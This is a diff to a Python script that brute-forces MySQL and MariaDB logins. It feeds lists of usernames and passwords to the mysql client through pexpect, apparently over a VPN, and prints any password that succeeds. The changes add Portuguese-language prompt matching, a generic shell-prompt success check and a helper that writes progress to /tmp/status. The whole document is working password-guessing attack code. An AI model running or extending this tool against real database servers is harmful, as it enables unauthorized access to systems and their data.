@@ -4,6 +4,7 @@ import passwords
 import time
 import vpn
 import users
+from pathlib import Path
 
 passwordsl = passwords.passwords_
 usersl = users.users_
@@ -13,10 +14,26 @@ finded = False
 
 LOGIN_SUCCESS_MARIADB = 0
 LOGIN_SUCCESS_MYSQL = 1
-ERROR_1698 = 2
-LOGIN_DENIED = 3
-END = 4
-TIMEOUT = 5
+LOGIN_SUCCESS_MARIADB_PT = 2
+LOGIN_SUCCESS_MYSQL_PT = 3
+LOGIN_SUCCESS_PROMPT = 4
+ERROR_1698 = 5
+ERROR_1045 = 6
+END = 7
+TIMEOUT = 8
+
+
+def update_status(line_number, value):
+    status_file = Path("/tmp/status")
+    with status_file.open("r", encoding="utf-8") as f:
+        lines = f.readlines()
+    while len(lines) < 5:
+        lines.append("\n")
+    lines[line_number] = f"{value}\n"
+    temporary_file = status_file.with_suffix(".tmp")
+    with temporary_file.open("w", encoding="utf-8") as f:
+        f.writelines(lines)
+    temporary_file.replace(status_file)
 
 
 def expect_state(process, patterns):
@@ -40,27 +57,18 @@ tries_exceeded = 0
 
 while i < len(usersl):
 
-    with open("/tmp/status", "r") as f:
-        lines = f.readlines()
-
-    lines[1] = f"{i}\n"
-
-    with open("/tmp/status", "w") as f:
-        f.writelines(lines)
+    update_status(1, i)
 
     while j < len(passwordsl):
 
-        with open("/tmp/status", "r") as f:
-            lines = f.readlines()
-    
-        lines[2] = f"{j}\n"
-
-        with open("/tmp/status", "w") as f:
-            f.writelines(lines)
+        update_status(2, j)
 
         process = pexpect.spawn("mysql", ["-u", usersl[i], "-p", destino], encoding="utf-8", timeout=10)
 
-        result = expect_state(process, ["Enter password:"])
+        result = expect_state(
+            process,
+            [r"(?i)(?:Enter password|Digite a senha):"],
+        )
 
         if result == 0:
             try:
@@ -74,30 +82,33 @@ while i < len(usersl):
             result = expect_state(process, [
                 r"Welcome to the MariaDB monitor",
                 r"Welcome to the MySQL monitor",
-                r"ERROR 1698 .*Access denied for user",
-                r"ERROR 1045 .*Access denied for user",
+                r"Bem-vindo ao monitor do MariaDB",
+                r"Bem-vindo ao monitor do MySQL",
+                r"(?m)^(?:mysql|MariaDB(?:\s+\[[^\r\n]*\])?)>\s*",
+                r"ERROR 1698",
+                r"ERROR 1045",
                 pexpect.EOF,
                 pexpect.TIMEOUT,
             ])
 
-        if result in (LOGIN_SUCCESS_MARIADB, LOGIN_SUCCESS_MYSQL):
+        if result in (
+            LOGIN_SUCCESS_MARIADB,
+            LOGIN_SUCCESS_MYSQL,
+            LOGIN_SUCCESS_MARIADB_PT,
+            LOGIN_SUCCESS_MYSQL_PT,
+            LOGIN_SUCCESS_PROMPT,
+        ):
             password = passwordsl[j]
             print(password)
             process.close()
 
             finded = True
 
-            with open("/tmp/status", "r") as f:
-                lines = f.readlines()
-            
-            lines[3] = "True\n"
-
-            with open("/tmp/status", "w") as f:
-                f.writelines(lines)
+            update_status(3, "True")
 
             break
 
-        if result in (ERROR_1698, LOGIN_DENIED):
+        if result in (ERROR_1698, ERROR_1045):
             print("Senha recusada pelo MySQL.")
         elif result == END:
             print("A conexão com o MySQL foi encerrada.")
@@ -115,13 +126,7 @@ while i < len(usersl):
             tries_exceeded += 1
 
             if tries_exceeded >= 15:
-                with open("/tmp/status", "r") as f:
-                    lines = f.readlines()
-                
-                lines[4] = "Muitas tentativas falhadas. Arquivo encerrado\n"
-
-                with open("/tmp/status", "w") as f:
-                    f.writelines(lines)
+                update_status(4, "Muitas tentativas falhadas. Arquivo encerrado")
 
                 print("Muitas tentativas falhadas. Encerrando...")
                 process.close()
@@ -148,5 +153,8 @@ while i < len(usersl):
 
     i += 1
     j = 0
+
+if not finded and tries_exceeded < 15:
+    update_status(4, "Nenhuma combinação encontrada")
 
 openvpn_enter.close()
